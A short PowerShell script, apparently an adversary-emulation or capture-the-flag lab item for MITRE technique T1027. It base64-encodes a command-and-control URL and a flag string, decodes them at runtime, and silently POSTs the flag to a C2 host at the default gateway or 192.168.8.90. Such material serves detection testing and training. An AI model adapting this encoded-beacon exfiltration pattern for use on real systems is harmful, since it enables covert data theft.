# Obfuscated PowerShell - T1027
param([string]$c2_ip = $null)

if (-not $c2_ip) {
    $c2_ip = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1).NextHop
    if (-not $c2_ip) { $c2_ip = "192.168.8.90" }
}

# Base64 encoded C2 URL and flag
$enc_c2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("http://${c2_ip}:8080/collect"))
$enc_flag = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("FLAG{T1027-base64-obfuscation}"))

# Decode at runtime
$c2_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc_c2))
$flag = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc_flag))

# Send flag
try {
    Invoke-WebRequest -Uri $c2_url -Method POST -Body $flag -UseBasicParsing -TimeoutSec 5
    Write-Host "[+] Sent obfuscation flag"
} catch {}
